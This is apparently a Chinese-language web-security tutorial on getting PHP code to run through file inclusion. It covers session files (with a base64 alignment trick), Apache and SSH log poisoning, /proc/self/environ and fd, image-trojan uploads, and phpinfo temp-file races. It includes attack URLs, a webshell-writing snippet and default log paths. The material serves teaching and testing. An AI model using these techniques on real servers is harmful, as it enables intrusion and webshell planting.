session的文件名格式为`sess_[phpsessid]`。而phpsessid在发送的请求的cookie字段中可以看到。
[](https://p0.ssl.qhimg.com/t015a8e17e5fd3092df.png)
要包含并利用的话，需要能控制部分session文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。
这里来两个例子:
例子1：
    # 第3行
    session_start();
    if($_SESSION['username']) {
        header('Location: index.php');
        exit;
    }
    # 第8行
    if($_POST['username'] && $_POST['password']) {
        $username = $_POST['username'];
    # 第20行
        $stmt->bind_result($res_password);
    # 第24行
        if ($res_password == $password) {
            $_SESSION['username'] = base64_encode($username);
            header("location:index.php");
这里使用了session来保存用户会话，[php手册](http://php.net/manual/zh/session.examples.basic.php)中是这样描述的：
  1. PHP 会将会话中的数据设置到 `$_SESSION` 变量中。
  2. 当 PHP 停止的时候，它会自动读取 `$_SESSION` 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。
  3. 对于文件会话保存管理器，会将会话数据保存到配置项 `session.save_path` 所指定的位置。
考虑到变量`$username`是我们可控的，并且被设置到了`$_SESSION`中，因此我们输入的数据未经过滤的就被写入到了对应的sessioin文件中。结合前面的php文件包含，可以推测这里可以包含session文件。
要包含session文件，需要知道文件的路径。先注册一个用户，比如Johnson。等登陆成功后，记录下cookie中的PHPSESSID的值，这里为0d0385dc6a1067f4e3406191（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，名称都为`sess_cookie值`）
访问：
    http://x.x.x.x/index.php?action=/var/lib/php5/sess_0d0385dc6a1067f4e3406191
其中`/var/lib/php5/`的session文件路径是测试出来的，常见的php-session存放位置在上面也有列出来了。
这里能包含，并且控制session文件，但要写入可用的payload，还需要绕过：
    $_SESSION['username'] = base64_encode($username);
如前面所示，输入的用户名会被base64加密。如果直接用php伪协议来解密整个session文件，由于序列化的前缀，肯定会导致乱码。
那么这里需要考虑一下base64的编码过程。比如编码abc。
    未编码: abc
    转成ascii码： 97 98 99
    转成对应二进制（三组，每组8位）： 01100001 01100010 01100011
    重分组（四组，每组6位）： 011000 010110 001001 100011
    每组高位补零，变为每组8位：00011000 00010110 00001001 00100011
    每组对应转为十进制： 24 22 9 35
    查Base64编码表得： Y W J j
考虑一下session的前缀：`username|s:12:"`，中间的数字12表示后面base64串的长度。当base64串的长度小于100时，前缀的长度固定为15个字符，当base64串的长度大于100小于1000时，前缀的长度固定为16个字符。
由于16个字符，恰好满足以下条件：
    16个字符 => 16 * 6 = 96 位 => 96 mod 8 = 0
也就是说，当对session文件进行base64解密时，前16个字符固然被解密为乱码，但不会再影响从第17个字符后的部分也就是base64加密后的username。
那么这里注册一个账号`JohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnsonJohnson`,其base64加密后的长度为128，大于100。（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，名称都为`sess_cookie值`）
访问：`http://x.x.x.x/index.php  
?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_0d0385dc6a1067f4e3406191  
&abcdefg=phpinfo();`
成功执行，即成功getshell了。
例子2：现在有一个session.php可控用户会话信息值：
        session_start();
        $username = $_POST['username'];
        $_SESSION['username'] = $username;
可以看到这个session.php文件中的用户会话信息username的值是用户可控制的，那我们就可以传入恶意代码进行攻击利用。
如果这里有注册功能，那么我们先注册一个用户``。然后用其登录：`username=`。等登陆成功后，记录下cookie中的PHPSESSID的值，这里为`r7csmqpu1lul3elgsb6o9g6u1b`。（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，那么直接不注册输入``登录也能生成，名称都为`sess_cookie值`）
我们这里以上帝视角来查看下session文件，可见恶意代码被写入了：
[](https://p3.ssl.qhimg.com/t01a9ffc0fe93308b78.png)
将恶意代码传入以后，接下来就要利用文件包含漏洞去包含这个恶意代码。
`fileinclude.php?file=D:\phpStudy\PHPTutorial\tmp\tmp\sess_r7csmqpu1lul3elgsb6o9g6u1b`
[](https://p3.ssl.qhimg.com/t01aa2581c0b283920e.png)
**注意命令执行和写入木马**
都是可以的，只要将上面的``替换成所对应的php代码，然后进行包含文件即可。
###  包含日志
**访问日志**
利用条件：
需要知道服务器日志的存储路径，且日志文件可读。
姿势：
很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入`access.log`，当发生错误时将错误写入`error.log`。默认情况下，日志保存路径在
`/var/log/apache2/`。
日志存储默认路径：
    1.apache+Linux日志默认路径：/etc/httpd/logs/access.log或/var/log/httpd/access.log
    2.apache+win2003日志默认路径：D:\xampp\apache\logs\access.log、D:\xampp\apache\logs\error.log
    3.IIS6.0+win2003默认日志文件：C:\WINDOWS\system32\Logfiles
    4.IIS7.0+win2003 默认日志文件：%SystemDrive%\inetpub\logs\LogFiles
    5.nginx 日志文件：日志文件在用户安装目录logs目录下,假设安装路径为/usr/local/nginx,那日志目录就是在/usr/local/nginx/logs下面
但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。比如下面的``修改为`%3C?php%20phpinfo();%20?%3E`
[](https://p4.ssl.qhimg.com/t010ad1154c36749765.png)
正常的php代码已经写入了 `/var/log/apache2/access.log`，然后进行包含即可。
在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。
中间件默认配置文件存放路径：
    1.apache+linux 默认配置文件
            /etc/httpd/conf/httpd.conf或/etc/init.d/httpd
    2. IIS6.0+win2003 配置文件
            C:/Windows/system32/inetsrv/metabase.xml
    3. IIS7.0+WIN 配置文件
            C:\Windows\System32\inetsrv\config\applicationHost.config
**注意命令执行和写入木马**
都是可以的，只要将上面的``替换成所对应的php代码，然后像上面一样注意下编码问题，然后进行包含文件即可。
**SSH log**
利用条件：
需要知道`ssh-log`的位置，且可读。默认情况下为
1./var/log/auth.log
2./var/log/secure
姿势：
用ssh连接：
`ssh ''[@remotehost](https://github.com/remotehost
"@remotehost")`
之后会提示输入密码，随便输入就可以。
[](https://p0.ssl.qhimg.com/t01c5b194cf75b94ea3.png)
然后在`remotehost`的`ssh-log`中就写入了这个php代码
然后利用文件包含，包含日志文件：
[](https://p0.ssl.qhimg.com/t01641fc4032fa5c527.png)
**注意命令执行和写入木马**
都是可以的，只要将上面的``替换成所对应的php代码，然后进行包含文件即可。
###  包含environ
利用条件：
  1. php以cgi方式运行，这样environ才会保持UA头。
  2. environ文件存储位置已知，且environ文件可读。environ文件默认位置：`/proc/self/environ`。在Linux系统下(FreeBSD是没有这个的)。Windows系统没有。
姿势：
`proc/self/environ`中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。
例如：我们现在访问一个网站，使用burpsuite抓包，将恶意代码插入到user-agent中：
[](https://p4.ssl.qhimg.com/t0128edf860508eb9c3.png)
然后利用文件包含漏洞去包含`proc/self/environ`，成功执行php代码。
[](https://p0.ssl.qhimg.com/t0175b4c8fb7a1ff6d2.png)
**注意命令执行和写入木马**
都是可以的，只要将上面的``替换成所对应的php代码，然后进行包含文件即可。
###  包含fd(文件描述符)
文件描述符：File
descriptor,简称fd，当应用程序请求内核打开/新建一个文件时，内核会返回一个文件描述符用于对应这个打开/新建的文件，其fd本质上就是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。
默认位置：`/proc/self/fd/`。在Linux系统下。Windows系统没有。
和`包含environ`类似。
**注意命令执行和写入木马**
都是可以的，同`包含environ`。
###  包含上传文件
很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。
利用条件：
千变万化，不过至少得知道上传的文件在哪，叫啥名字。
姿势：
先得制作图片马，有两种方式：
第一种是在cmd命令行下，比如图片1.jpg和包含php代码`fputs(fopen('hack.php','w'),'');?>`的2.php，它们得在同一目录，然后cmd在该目录下执行：`copy 1.jpg/b+2.php
3.jpg`，将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg
假设已经上传一句话图片木马到服务器，路径为`/upload/202107.jpg`
然后访问URL：`http://x.x.x.x/index.php?page=./upload/202107.jpg`，包含这张图片，将会在`index.php`所在的目录下生成`hack.php`，然后用shell管理工具就能成功连接。
那么同理，命令执行也是可行的。不过都getshell了，其中也能命令执行。
###  包含临时文件
这里先来一张原理图。这种姿势类似利用临时文件的存在，竞争时间去包含的：
[](https://p2.ssl.qhimg.com/t01561a2f4c958ce606.png)
php中上传文件，会创建临时文件。在linux下使用`/tmp`目录，而在windows下使用`c:\winsdows\temp`目录。在临时文件被删除之前，利用竞争即可包含该临时文件。
由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535种不同的文件名，所以这个方法是可行的。
另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可：
条件：
存在phpinfo页面并且存在文件包含漏洞
原理：
    1.当我们给PHP发送POST数据包时，如果数据包里包含文件区块，PHP就会将文件保存成一个临时文件，路径通常为：/tmp/php[6个随机字符],这个临时文件，在请求结束后就会被删除。 
    2.因为phpinfo页面会将请求上下文中的所有变量打出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，就可以在返回包里找到临时文件名，也就是\$_FILES变量中的内容。
姿势：
类似利用临时文件的存在，竞争时间去包含的。
这里我是以Linux下的环境为例，脚本也是只有服务器是Linux系统才能使用：
首先我们使用vulhub的脚本：[vulhub/exp.py at
master](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)。他可以实现包含临时文件，而这个临时文件的内容是：`')?>`。成功包含这个文件后就会生成新的文件`/tmp/p`，这个文件就会永久的留在目标机器上。
[](https://p4.ssl.qhimg.com/t0141b594a3b5527eac.png)
写入成功以后，我们利用文件包含来执行任意命令。
[](https://p2.ssl.qhimg.com/t016c8eff88bb0b194b.png)
那么vulhub的脚本是如何做到在临时脚本文件删除前去包含的呢？其实就是用到了条件竞争，具体流程大致如下：
    1.首先发送包含webshell的数据包给phpinfo页面，并用大量的垃圾数据将header和get等位置填满。
    2.因phpinfo页面会将所有数据打印出来，第一个步骤中的垃圾数据就会将phpinfo页面撑的非常大。而php默认输出缓冲区大小为4096，也可以理解为php每次返回4096个字节给socket连接。